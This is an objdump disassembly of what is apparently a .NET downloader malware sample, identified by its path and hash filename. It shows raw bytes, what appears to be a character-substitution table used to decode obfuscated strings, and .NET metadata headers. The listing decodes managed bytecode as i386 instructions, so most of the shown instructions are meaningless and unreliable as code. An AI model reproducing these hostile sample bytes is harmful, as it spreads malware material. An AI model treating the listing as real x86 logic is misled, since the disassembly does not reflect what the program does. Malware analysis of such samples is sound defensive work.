
malware_samples/downloader/2d4454d610ae48bf9ffbb7bafcf80140a286898a7ffda39113da1820575a892f.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	1c 33                	sbb    $0x33,%al
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 cc 24 00    	add    %al,0x24cc00
  402013:	00 00                	add    %al,(%eax)
  402015:	0e                   	push   %cs
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	07                   	pop    %es
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	1e                   	push   %ds
  402051:	02 28                	add    (%eax),%ch
  402053:	0d 00 00 0a 2a       	or     $0x2a0a0000,%eax
  402058:	5e                   	pop    %esi
  402059:	02 28                	add    (%eax),%ch
  40205b:	0d 00 00 0a 02       	or     $0x20a0000,%eax
  402060:	17                   	pop    %ss
  402061:	8d 17                	lea    (%edi),%edx
  402063:	00 00                	add    %al,(%eax)
  402065:	01 25 16 03 9c 7d    	add    %esp,0x7d9c0316
  40206b:	01 00                	add    %eax,(%eax)
  40206d:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402070:	3a 02                	cmp    (%edx),%al
  402072:	28 0d 00 00 0a 02    	sub    %cl,0x20a0000
  402078:	03 7d 01             	add    0x1(%ebp),%edi
  40207b:	00 00                	add    %al,(%eax)
  40207d:	04 2a                	add    $0x2a,%al
  40207f:	3a 02                	cmp    (%edx),%al
  402081:	28 0d 00 00 0a 02    	sub    %cl,0x20a0000
  402087:	03 7d 02             	add    0x2(%ebp),%edi
  40208a:	00 00                	add    %al,(%eax)
  40208c:	04 2a                	add    $0x2a,%al
  40208e:	00 00                	add    %al,(%eax)
  402090:	13 30                	adc    (%eax),%esi
  402092:	04 00                	add    $0x0,%al
  402094:	db 02                	fildl  (%edx)
  402096:	00 00                	add    %al,(%eax)
  402098:	01 00                	add    %eax,(%eax)
  40209a:	00 11                	add    %dl,(%ecx)
  40209c:	72 01                	jb     0x40209f
  40209e:	00 00                	add    %al,(%eax)
  4020a0:	70 0a                	jo     0x4020ac
  4020a2:	73 0e                	jae    0x4020b2
  4020a4:	00 00                	add    %al,(%eax)
  4020a6:	0a 25 1f 47 1f 30    	or     0x301f471f,%ah
  4020ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4020ad:	0f 00 00             	sldt   (%eax)
  4020b0:	0a 25 1f 56 1f 31    	or     0x311f561f,%ah
  4020b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4020b7:	0f 00 00             	sldt   (%eax)
  4020ba:	0a 25 1f 55 1f 32    	or     0x321f551f,%ah
  4020c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4020c1:	0f 00 00             	sldt   (%eax)
  4020c4:	0a 25 1f 7a 1f 33    	or     0x331f7a1f,%ah
  4020ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4020cb:	0f 00 00             	sldt   (%eax)
  4020ce:	0a 25 1f 78 1f 34    	or     0x341f781f,%ah
  4020d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4020d5:	0f 00 00             	sldt   (%eax)
  4020d8:	0a 25 1f 69 1f 35    	or     0x351f691f,%ah
  4020de:	6f                   	outsl  %ds:(%esi),(%dx)
  4020df:	0f 00 00             	sldt   (%eax)
  4020e2:	0a 25 1f 39 1f 36    	or     0x361f391f,%ah
  4020e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4020e9:	0f 00 00             	sldt   (%eax)
  4020ec:	0a 25 1f 52 1f 37    	or     0x371f521f,%ah
  4020f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4020f3:	0f 00 00             	sldt   (%eax)
  4020f6:	0a 25 1f 62 1f 38    	or     0x381f621f,%ah
  4020fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4020fd:	0f 00 00             	sldt   (%eax)
  402100:	0a 25 1f 57 1f 39    	or     0x391f571f,%ah
  402106:	6f                   	outsl  %ds:(%esi),(%dx)
  402107:	0f 00 00             	sldt   (%eax)
  40210a:	0a 25 1f 6e 1f 61    	or     0x611f6e1f,%ah
  402110:	6f                   	outsl  %ds:(%esi),(%dx)
  402111:	0f 00 00             	sldt   (%eax)
  402114:	0a 25 1f 54 1f 62    	or     0x621f541f,%ah
  40211a:	6f                   	outsl  %ds:(%esi),(%dx)
  40211b:	0f 00 00             	sldt   (%eax)
  40211e:	0a 25 1f 53 1f 63    	or     0x631f531f,%ah
  402124:	6f                   	outsl  %ds:(%esi),(%dx)
  402125:	0f 00 00             	sldt   (%eax)
  402128:	0a 25 1f 45 1f 64    	or     0x641f451f,%ah
  40212e:	6f                   	outsl  %ds:(%esi),(%dx)
  40212f:	0f 00 00             	sldt   (%eax)
  402132:	0a 25 1f 59 1f 65    	or     0x651f591f,%ah
  402138:	6f                   	outsl  %ds:(%esi),(%dx)
  402139:	0f 00 00             	sldt   (%eax)
  40213c:	0a 25 1f 63 1f 66    	or     0x661f631f,%ah
  402142:	6f                   	outsl  %ds:(%esi),(%dx)
  402143:	0f 00 00             	sldt   (%eax)
  402146:	0a 25 1f 64 1f 67    	or     0x671f641f,%ah
  40214c:	6f                   	outsl  %ds:(%esi),(%dx)
  40214d:	0f 00 00             	sldt   (%eax)
  402150:	0a 25 1f 67 1f 68    	or     0x681f671f,%ah
  402156:	6f                   	outsl  %ds:(%esi),(%dx)
  402157:	0f 00 00             	sldt   (%eax)
  40215a:	0a 25 1f 58 1f 69    	or     0x691f581f,%ah
  402160:	6f                   	outsl  %ds:(%esi),(%dx)
  402161:	0f 00 00             	sldt   (%eax)
  402164:	0a 25 1f 6a 1f 6a    	or     0x6a1f6a1f,%ah
  40216a:	6f                   	outsl  %ds:(%esi),(%dx)
  40216b:	0f 00 00             	sldt   (%eax)
  40216e:	0a 25 1f 42 1f 6b    	or     0x6b1f421f,%ah
  402174:	6f                   	outsl  %ds:(%esi),(%dx)
  402175:	0f 00 00             	sldt   (%eax)
  402178:	0a 25 1f 71 1f 6c    	or     0x6c1f711f,%ah
  40217e:	6f                   	outsl  %ds:(%esi),(%dx)
  40217f:	0f 00 00             	sldt   (%eax)
  402182:	0a 25 1f 33 1f 6d    	or     0x6d1f331f,%ah
  402188:	6f                   	outsl  %ds:(%esi),(%dx)
  402189:	0f 00 00             	sldt   (%eax)
  40218c:	0a 25 1f 6f 1f 6e    	or     0x6e1f6f1f,%ah
  402192:	6f                   	outsl  %ds:(%esi),(%dx)
  402193:	0f 00 00             	sldt   (%eax)
  402196:	0a 25 1f 50 1f 6f    	or     0x6f1f501f,%ah
  40219c:	6f                   	outsl  %ds:(%esi),(%dx)
  40219d:	0f 00 00             	sldt   (%eax)
  4021a0:	0a 25 1f 6d 1f 70    	or     0x701f6d1f,%ah
  4021a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4021a7:	0f 00 00             	sldt   (%eax)
  4021aa:	0a 25 1f 6c 1f 71    	or     0x711f6c1f,%ah
  4021b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4021b1:	0f 00 00             	sldt   (%eax)
  4021b4:	0a 25 1f 31 1f 72    	or     0x721f311f,%ah
  4021ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4021bb:	0f 00 00             	sldt   (%eax)
  4021be:	0a 25 1f 46 1f 73    	or     0x731f461f,%ah
  4021c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4021c5:	0f 00 00             	sldt   (%eax)
  4021c8:	0a 25 1f 30 1f 74    	or     0x741f301f,%ah
  4021ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4021cf:	0f 00 00             	sldt   (%eax)
  4021d2:	0a 25 1f 65 1f 75    	or     0x751f651f,%ah
  4021d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4021d9:	0f 00 00             	sldt   (%eax)
  4021dc:	0a 25 1f 77 1f 76    	or     0x761f771f,%ah
  4021e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e3:	0f 00 00             	sldt   (%eax)
  4021e6:	0a 25 1f 61 1f 77    	or     0x771f611f,%ah
  4021ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ed:	0f 00 00             	sldt   (%eax)
  4021f0:	0a 25 1f 75 1f 78    	or     0x781f751f,%ah
  4021f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4021f7:	0f 00 00             	sldt   (%eax)
  4021fa:	0a 25 1f 4a 1f 79    	or     0x791f4a1f,%ah
  402200:	6f                   	outsl  %ds:(%esi),(%dx)
  402201:	0f 00 00             	sldt   (%eax)
  402204:	0a 25 1f 74 1f 7a    	or     0x7a1f741f,%ah
  40220a:	6f                   	outsl  %ds:(%esi),(%dx)
  40220b:	0f 00 00             	sldt   (%eax)
  40220e:	0a 25 1f 72 1f 41    	or     0x411f721f,%ah
  402214:	6f                   	outsl  %ds:(%esi),(%dx)
  402215:	0f 00 00             	sldt   (%eax)
  402218:	0a 25 1f 43 1f 42    	or     0x421f431f,%ah
  40221e:	6f                   	outsl  %ds:(%esi),(%dx)
  40221f:	0f 00 00             	sldt   (%eax)
  402222:	0a 25 1f 5a 1f 43    	or     0x431f5a1f,%ah
  402228:	6f                   	outsl  %ds:(%esi),(%dx)
  402229:	0f 00 00             	sldt   (%eax)
  40222c:	0a 25 1f 51 1f 44    	or     0x441f511f,%ah
  402232:	6f                   	outsl  %ds:(%esi),(%dx)
  402233:	0f 00 00             	sldt   (%eax)
  402236:	0a 25 1f 49 1f 45    	or     0x451f491f,%ah
  40223c:	6f                   	outsl  %ds:(%esi),(%dx)
  40223d:	0f 00 00             	sldt   (%eax)
  402240:	0a 25 1f 73 1f 46    	or     0x461f731f,%ah
  402246:	6f                   	outsl  %ds:(%esi),(%dx)
  402247:	0f 00 00             	sldt   (%eax)
  40224a:	0a 25 1f 3d 1f 47    	or     0x471f3d1f,%ah
  402250:	6f                   	outsl  %ds:(%esi),(%dx)
  402251:	0f 00 00             	sldt   (%eax)
  402254:	0a 25 1f 44 1f 48    	or     0x481f441f,%ah
  40225a:	6f                   	outsl  %ds:(%esi),(%dx)
  40225b:	0f 00 00             	sldt   (%eax)
  40225e:	0a 25 1f 4f 1f 49    	or     0x491f4f1f,%ah
  402264:	6f                   	outsl  %ds:(%esi),(%dx)
  402265:	0f 00 00             	sldt   (%eax)
  402268:	0a 25 1f 37 1f 4a    	or     0x4a1f371f,%ah
  40226e:	6f                   	outsl  %ds:(%esi),(%dx)
  40226f:	0f 00 00             	sldt   (%eax)
  402272:	0a 25 1f 79 1f 4b    	or     0x4b1f791f,%ah
  402278:	6f                   	outsl  %ds:(%esi),(%dx)
  402279:	0f 00 00             	sldt   (%eax)
  40227c:	0a 25 1f 48 1f 4c    	or     0x4c1f481f,%ah
  402282:	6f                   	outsl  %ds:(%esi),(%dx)
  402283:	0f 00 00             	sldt   (%eax)
  402286:	0a 25 1f 76 1f 4d    	or     0x4d1f761f,%ah
  40228c:	6f                   	outsl  %ds:(%esi),(%dx)
  40228d:	0f 00 00             	sldt   (%eax)
  402290:	0a 25 1f 4d 1f 4e    	or     0x4e1f4d1f,%ah
  402296:	6f                   	outsl  %ds:(%esi),(%dx)
  402297:	0f 00 00             	sldt   (%eax)
  40229a:	0a 25 1f 4c 1f 4f    	or     0x4f1f4c1f,%ah
  4022a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a1:	0f 00 00             	sldt   (%eax)
  4022a4:	0a 25 1f 4e 1f 50    	or     0x501f4e1f,%ah
  4022aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4022ab:	0f 00 00             	sldt   (%eax)
  4022ae:	0a 25 1f 32 1f 51    	or     0x511f321f,%ah
  4022b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b5:	0f 00 00             	sldt   (%eax)
  4022b8:	0a 25 1f 36 1f 52    	or     0x521f361f,%ah
  4022be:	6f                   	outsl  %ds:(%esi),(%dx)
  4022bf:	0f 00 00             	sldt   (%eax)
  4022c2:	0a 25 1f 70 1f 53    	or     0x531f701f,%ah
  4022c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4022c9:	0f 00 00             	sldt   (%eax)
  4022cc:	0a 25 1f 66 1f 54    	or     0x541f661f,%ah
  4022d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4022d3:	0f 00 00             	sldt   (%eax)
  4022d6:	0a 25 1f 41 1f 55    	or     0x551f411f,%ah
  4022dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4022dd:	0f 00 00             	sldt   (%eax)
  4022e0:	0a 25 1f 35 1f 56    	or     0x561f351f,%ah
  4022e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022e7:	0f 00 00             	sldt   (%eax)
  4022ea:	0a 25 1f 4b 1f 57    	or     0x571f4b1f,%ah
  4022f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4022f1:	0f 00 00             	sldt   (%eax)
  4022f4:	0a 25 1f 68 1f 58    	or     0x581f681f,%ah
  4022fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4022fb:	0f 00 00             	sldt   (%eax)
  4022fe:	0a 25 1f 38 1f 59    	or     0x591f381f,%ah
  402304:	6f                   	outsl  %ds:(%esi),(%dx)
  402305:	0f 00 00             	sldt   (%eax)
  402308:	0a 25 1f 6b 1f 5a    	or     0x5a1f6b1f,%ah
  40230e:	6f                   	outsl  %ds:(%esi),(%dx)
  40230f:	0f 00 00             	sldt   (%eax)
  402312:	0a 25 1f 34 1f 3d    	or     0x3d1f341f,%ah
  402318:	6f                   	outsl  %ds:(%esi),(%dx)
  402319:	0f 00 00             	sldt   (%eax)
  40231c:	0a 0b                	or     (%ebx),%cl
  40231e:	72 03                	jb     0x402323
  402320:	00 00                	add    %al,(%eax)
  402322:	70 28                	jo     0x40234c
  402324:	10 00                	adc    %al,(%eax)
  402326:	00 0a                	add    %cl,(%edx)
  402328:	0c 16                	or     $0x16,%al
  40232a:	0d 2b 3f 08 09       	or     $0x9083f2b,%eax
  40232f:	6f                   	outsl  %ds:(%esi),(%dx)
  402330:	11 00                	adc    %eax,(%eax)
  402332:	00 0a                	add    %cl,(%edx)
  402334:	13 04 07             	adc    (%edi,%eax,1),%eax
  402337:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  40233a:	12 00                	adc    (%eax),%al
  40233c:	00 0a                	add    %cl,(%edx)
  40233e:	2c 1a                	sub    $0x1a,%al
  402340:	06                   	push   %es
  402341:	07                   	pop    %es
  402342:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402345:	13 00                	adc    (%eax),%eax
  402347:	00 0a                	add    %cl,(%edx)
  402349:	13 05 12 05 28 14    	adc    0x14280512,%eax
  40234f:	00 00                	add    %al,(%eax)
  402351:	0a 28                	or     (%eax),%ch
  402353:	15 00 00 0a 0a       	adc    $0xa0a0000,%eax
  402358:	2b 0e                	sub    (%esi),%ecx
  40235a:	06                   	push   %es
  40235b:	12 04 28             	adc    (%eax,%ebp,1),%al
  40235e:	14 00                	adc    $0x0,%al
  402360:	00 0a                	add    %cl,(%edx)
  402362:	28 15 00 00 0a 0a    	sub    %dl,0xa0a0000
  402368:	09 17                	or     %edx,(%edi)
  40236a:	58                   	pop    %eax
  40236b:	0d 09 08 6f 16       	or     $0x166f0809,%eax
  402370:	00 00                	add    %al,(%eax)
  402372:	0a 32                	or     (%edx),%dh
  402374:	b8 06 2a 00 1b       	mov    $0x1b002a06,%eax
  402379:	30 06                	xor    %al,(%esi)
  40237b:	00 21                	add    %ah,(%ecx)
  40237d:	01 00                	add    %eax,(%eax)
  40237f:	00 02                	add    %al,(%edx)
  402381:	00 00                	add    %al,(%eax)
  402383:	11 16                	adc    %edx,(%esi)
  402385:	28 17                	sub    %dl,(%edi)
  402387:	00 00                	add    %al,(%eax)
  402389:	0a 72 17             	or     0x17(%edx),%dh
  40238c:	00 00                	add    %al,(%eax)
  40238e:	70 72                	jo     0x402402
  402390:	45                   	inc    %ebp
  402391:	00 00                	add    %al,(%eax)
  402393:	70 1b                	jo     0x4023b0
  402395:	28 05 00 00 06 1f    	sub    %al,0x1f060000
  40239b:	63 33                	arpl   %esi,(%ebx)
  40239d:	06                   	push   %es
  40239e:	16                   	push   %ss
  40239f:	28 18                	sub    %bl,(%eax)
  4023a1:	00 00                	add    %al,(%eax)
  4023a3:	0a 73 19             	or     0x19(%ebx),%dh
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	0a 0a                	or     (%edx),%cl
  4023aa:	06                   	push   %es
  4023ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4023ac:	1a 00                	sbb    (%eax),%al
  4023ae:	00 0a                	add    %cl,(%edx)
  4023b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4023b1:	1b 00                	sbb    (%eax),%eax
  4023b3:	00 0a                	add    %cl,(%edx)
  4023b5:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  4023b8:	2e 11 04 6f          	adc    %eax,%cs:(%edi,%ebp,2)
  4023bc:	1c 00                	sbb    $0x0,%al
  4023be:	00 0a                	add    %cl,(%edx)
  4023c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4023c1:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  4023c6:	1e                   	push   %ds
  4023c7:	00 00                	add    %al,(%eax)
  4023c9:	0a 16                	or     (%esi),%dl
  4023cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4023cc:	1f                   	pop    %ds
  4023cd:	00 00                	add    %al,(%eax)
  4023cf:	0a 6f 20             	or     0x20(%edi),%ch
  4023d2:	00 00                	add    %al,(%eax)
  4023d4:	0a 72 51             	or     0x51(%edx),%dh
  4023d7:	00 00                	add    %al,(%eax)
  4023d9:	70 6f                	jo     0x40244a
  4023db:	21 00                	and    %eax,(%eax)
  4023dd:	00 0a                	add    %cl,(%edx)
  4023df:	2c 06                	sub    $0x6,%al
  4023e1:	16                   	push   %ss
  4023e2:	28 18                	sub    %bl,(%eax)
  4023e4:	00 00                	add    %al,(%eax)
  4023e6:	0a 11                	or     (%ecx),%dl
  4023e8:	04 6f                	add    $0x6f,%al
  4023ea:	22 00                	and    (%eax),%al
  4023ec:	00 0a                	add    %cl,(%edx)
  4023ee:	2d c9 de 0c 11       	sub    $0x110cdec9,%eax
  4023f3:	04 2c                	add    $0x2c,%al
  4023f5:	07                   	pop    %es
  4023f6:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4023f9:	23 00                	and    (%eax),%eax
  4023fb:	00 0a                	add    %cl,(%edx)
  4023fd:	dc 06                	faddl  (%esi)
  4023ff:	6f                   	outsl  %ds:(%esi),(%dx)
  402400:	24 00                	and    $0x0,%al
  402402:	00 0a                	add    %cl,(%edx)
  402404:	0b 07                	or     (%edi),%eax
  402406:	6f                   	outsl  %ds:(%esi),(%dx)
  402407:	25 00 00 0a 72       	and    $0x720a0000,%eax
  40240c:	c5 00                	lds    (%eax),%eax
  40240e:	00 70 6f             	add    %dh,0x6f(%eax)
  402411:	26 00 00             	add    %al,%es:(%eax)
  402414:	0a 07                	or     (%edi),%al
  402416:	6f                   	outsl  %ds:(%esi),(%dx)
  402417:	27                   	daa
  402418:	00 00                	add    %al,(%eax)
  40241a:	0a 28                	or     (%eax),%ch
  40241c:	28 00                	sub    %al,(%eax)
  40241e:	00 0a                	add    %cl,(%edx)
  402420:	13 05 12 05 23 00    	adc    0x230512,%eax
  402426:	00 00                	add    %al,(%eax)
  402428:	00 00                	add    %al,(%eax)
  40242a:	00 f0                	add    %dh,%al
  40242c:	3f                   	aas
  40242d:	28 29                	sub    %ch,(%ecx)
  40242f:	00 00                	add    %al,(%eax)
  402431:	0a 73 2a             	or     0x2a(%ebx),%dh
  402434:	00 00                	add    %al,(%eax)
  402436:	0a 25 23 00 00 00    	or     0x23,%ah
  40243c:	00 00                	add    %al,(%eax)
  40243e:	00 24 40             	add    %ah,(%eax,%eax,2)
  402441:	28 2b                	sub    %ch,(%ebx)
  402443:	00 00                	add    %al,(%eax)
  402445:	0a 7e 2c             	or     0x2c(%esi),%bh
  402448:	00 00                	add    %al,(%eax)
  40244a:	0a 16                	or     (%esi),%dl
  40244c:	73 2d                	jae    0x40247b
  40244e:	00 00                	add    %al,(%eax)
  402450:	0a 6f 2e             	or     0x2e(%edi),%ch
  402453:	00 00                	add    %al,(%eax)
  402455:	0a 6f 01             	or     0x1(%edi),%ch
  402458:	00 00                	add    %al,(%eax)
  40245a:	2b 26                	sub    (%esi),%esp
  40245c:	28 06                	sub    %al,(%esi)
  40245e:	00 00                	add    %al,(%eax)
  402460:	06                   	push   %es
  402461:	0c 07                	or     $0x7,%al
  402463:	6f                   	outsl  %ds:(%esi),(%dx)
  402464:	1e                   	push   %ds
  402465:	00 00                	add    %al,(%eax)
  402467:	0a 72 df             	or     -0x21(%edx),%dh
  40246a:	00 00                	add    %al,(%eax)
  40246c:	70 72                	jo     0x4024e0
  40246e:	e7 00                	out    %eax,$0x0
  402470:	00 70 08             	add    %dh,0x8(%eax)
  402473:	28 15 00 00 0a 14    	sub    %dl,0x140a0000
  402479:	73 30                	jae    0x4024ab
  40247b:	00 00                	add    %al,(%eax)
  40247d:	0a 6f 02             	or     0x2(%edi),%ch
  402480:	00 00                	add    %al,(%eax)
  402482:	2b 26                	sub    (%esi),%esp
  402484:	72 80                	jb     0x402406
  402486:	01 00                	add    %eax,(%eax)
  402488:	70 0d                	jo     0x402497
  40248a:	06                   	push   %es
  40248b:	6f                   	outsl  %ds:(%esi),(%dx)
  40248c:	32 00                	xor    (%eax),%al
  40248e:	00 0a                	add    %cl,(%edx)
  402490:	09 07                	or     %eax,(%edi)
  402492:	6f                   	outsl  %ds:(%esi),(%dx)
  402493:	33 00                	xor    (%eax),%eax
  402495:	00 0a                	add    %cl,(%edx)
  402497:	26 de 0a             	fimuls %es:(%edx)
  40249a:	06                   	push   %es
  40249b:	2c 06                	sub    $0x6,%al
  40249d:	06                   	push   %es
  40249e:	6f                   	outsl  %ds:(%esi),(%dx)
  40249f:	23 00                	and    (%eax),%eax
  4024a1:	00 0a                	add    %cl,(%edx)
  4024a3:	dc 2a                	fsubrl (%edx)
  4024a5:	00 00                	add    %al,(%eax)
  4024a7:	00 01                	add    %al,(%ecx)
  4024a9:	1c 00                	sbb    $0x0,%al
  4024ab:	00 02                	add    %al,(%edx)
  4024ad:	00 33                	add    %dh,(%ebx)
  4024af:	00 3b                	add    %bh,(%ebx)
  4024b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4024b2:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4024b5:	00 00                	add    %al,(%eax)
  4024b7:	00 02                	add    %al,(%edx)
  4024b9:	00 26                	add    %ah,(%esi)
  4024bb:	00 f0                	add    %dh,%al
  4024bd:	16                   	push   %ss
  4024be:	01 0a                	add    %ecx,(%edx)
  4024c0:	00 00                	add    %al,(%eax)
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	1e                   	push   %ds
  4024c5:	02 28                	add    (%eax),%ch
  4024c7:	34 00                	xor    $0x0,%al
  4024c9:	00 0a                	add    %cl,(%edx)
  4024cb:	2a 42 53             	sub    0x53(%edx),%al
  4024ce:	4a                   	dec    %edx
  4024cf:	42                   	inc    %edx
  4024d0:	01 00                	add    %eax,(%eax)
  4024d2:	01 00                	add    %eax,(%eax)
  4024d4:	00 00                	add    %al,(%eax)
  4024d6:	00 00                	add    %al,(%eax)
  4024d8:	0c 00                	or     $0x0,%al
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	76 34                	jbe    0x402512
  4024de:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4024e1:	33 30                	xor    (%eax),%esi
  4024e3:	33 31                	xor    (%ecx),%esi
  4024e5:	39 00                	cmp    %eax,(%eax)
  4024e7:	00 00                	add    %al,(%eax)
  4024e9:	00 05 00 6c 00 00    	add    %al,0x6c00
  4024ef:	00 40 04             	add    %al,0x4(%eax)
  4024f2:	00 00                	add    %al,(%eax)
  4024f4:	23 7e 00             	and    0x0(%esi),%edi
  4024f7:	00 ac 04 00 00 48 05 	add    %ch,0x5480000(%esp,%eax,1)
  4024fe:	00 00                	add    %al,(%eax)
  402500:	23 53 74             	and    0x74(%ebx),%edx
  402503:	72 69                	jb     0x40256e
  402505:	6e                   	outsb  %ds:(%esi),(%dx)
  402506:	67 73 00             	addr16 jae 0x402509
  402509:	00 00                	add    %al,(%eax)
  40250b:	00 f4                	add    %dh,%ah
  40250d:	09 00                	or     %eax,(%eax)
  40250f:	00 98 01 00 00 23    	add    %bl,0x23000001(%eax)
  402515:	55                   	push   %ebp
  402516:	53                   	push   %ebx
  402517:	00 8c 0b 00 00 10 00 	add    %cl,0x100000(%ebx,%ecx,1)
  40251e:	00 00                	add    %al,(%eax)
  402520:	23 47 55             	and    0x55(%edi),%eax
  402523:	49                   	dec    %ecx
  402524:	44                   	inc    %esp
  402525:	00 00                	add    %al,(%eax)
  402527:	00 9c 0b 00 00 64 02 	add    %bl,0x2640000(%ebx,%ecx,1)
  40252e:	00 00                	add    %al,(%eax)
  402530:	23 42 6c             	and    0x6c(%edx),%eax
  402533:	6f                   	outsl  %ds:(%esi),(%dx)
  402534:	62 00                	bound  %eax,(%eax)
  402536:	00 00                	add    %al,(%eax)
  402538:	00 00                	add    %al,(%eax)
  40253a:	00 00                	add    %al,(%eax)
  40253c:	02 00                	add    (%eax),%al
  40253e:	00 01                	add    %al,(%ecx)
  402540:	57                   	push   %edi
  402541:	15 02 1c 09 08       	adc    $0x8091c02,%eax
  402546:	00 00                	add    %al,(%eax)
  402548:	00 fa                	add    %bh,%dl
  40254a:	01 33                	add    %esi,(%ebx)
  40254c:	00 16                	add    %dl,(%esi)
  40254e:	00 00                	add    %al,(%eax)
  402550:	01 00                	add    %eax,(%eax)
  402552:	00 00                	add    %al,(%eax)
  402554:	29 00                	sub    %eax,(%eax)
  402556:	00 00                	add    %al,(%eax)
  402558:	05 00 00 00 02       	add    $0x2000000,%eax
  40255d:	00 00                	add    %al,(%eax)
  40255f:	00 08                	add    %cl,(%eax)
  402561:	00 00                	add    %al,(%eax)
  402563:	00 05 00 00 00 34    	add    %al,0x34000000
  402569:	00 00                	add    %al,(%eax)
  40256b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40256e:	00 00                	add    %al,(%eax)
  402570:	02 00                	add    (%eax),%al
  402572:	00 00                	add    %al,(%eax)
  402574:	01 00                	add    %eax,(%eax)
  402576:	00 00                	add    %al,(%eax)
  402578:	03 00                	add    (%eax),%eax
  40257a:	00 00                	add    %al,(%eax)
  40257c:	01 00                	add    %eax,(%eax)
  40257e:	00 00                	add    %al,(%eax)
  402580:	01 00                	add    %eax,(%eax)
  402582:	00 00                	add    %al,(%eax)
  402584:	02 00                	add    (%eax),%al
  402586:	00 00                	add    %al,(%eax)
  402588:	02 00                	add    (%eax),%al
  40258a:	00 00                	add    %al,(%eax)
  40258c:	00 00                	add    %al,(%eax)
  40258e:	2e 02 01             	add    %cs:(%ecx),%al
  402591:	00 00                	add    %al,(%eax)
  402593:	00 00                	add    %al,(%eax)
  402595:	00 06                	add    %al,(%esi)
  402597:	00 a0 01 0d 04 06    	add    %ah,0x6040d01(%eax)
  40259d:	00 0b                	add    %cl,(%ebx)
  40259f:	02 0d 04 06 00 e8    	add    0xe8000604,%cl
  4025a5:	00 fa                	add    %bh,%dl
  4025a7:	03 0f                	add    (%edi),%ecx
  4025a9:	00 2d 04 00 00 06    	add    %ch,0x6000004
  4025af:	00 25 01 44 02 06    	add    %ah,0x6024401
  4025b5:	00 f2                	add    %dh,%dl
  4025b7:	01 c2                	add    %eax,%edx
  4025b9:	02 06                	add    (%esi),%al
  4025bb:	00 81 01 c2 02 06    	add    %al,0x602c201(%ecx)
  4025c1:	00 3e                	add    %bh,(%esi)
  4025c3:	01 c2                	add    %eax,%edx
  4025c5:	02 06                	add    (%esi),%al
  4025c7:	00 5b 01             	add    %bl,0x1(%ebx)
  4025ca:	c2 02 06             	ret    $0x602
  4025cd:	00 c0                	add    %al,%al
  4025cf:	01 c2                	add    %eax,%edx
  4025d1:	02 06                	add    (%esi),%al
  4025d3:	00 0e                	add    %cl,(%esi)
  4025d5:	01 c2                	add    %eax,%edx
  4025d7:	02 06                	add    (%esi),%al
  4025d9:	00 b5 00 0d 04 06    	add    %dh,0x6040d00(%ebp)
  4025df:	00 1f                	add    %bl,(%edi)
  4025e1:	02 96 02 06 00 c9    	add    -0x36fff9fe(%esi),%dl
  4025e7:	04 96                	add    $0x96,%al
  4025e9:	02 06                	add    (%esi),%al
  4025eb:	00 d0                	add    %dl,%al
  4025ed:	00 96 02 06 00 e1    	add    %dl,-0x1efff9fe(%esi)
  4025f3:	04 96                	add    $0x96,%al
  4025f5:	02 06                	add    (%esi),%al
  4025f7:	00 1d 00 46 00 0a    	add    %bl,0xa004600
  4025fd:	00 65 00             	add    %ah,0x0(%ebp)
  402600:	b5 03                	mov    $0x3,%ch
  402602:	0a 00                	or     (%eax),%al
  402604:	0e                   	push   %cs
  402605:	03 b5 03 06 00 0f    	add    0xf000603(%ebp),%esi
  40260b:	00 46 00             	add    %al,0x0(%esi)
  40260e:	0a 00                	or     (%eax),%al
  402610:	75 02                	jne    0x402614
  402612:	b5 03                	mov    $0x3,%ch
  402614:	06                   	push   %es
  402615:	00 8d 00 96 02 06    	add    %cl,0x6029600(%ebp)
  40261b:	00 29                	add    %ch,(%ecx)
  40261d:	02 96 02 06 00 88    	add    -0x77fff9fe(%esi),%dl
  402623:	00 33                	add    %dh,(%ebx)
  402625:	00 06                	add    %al,(%esi)
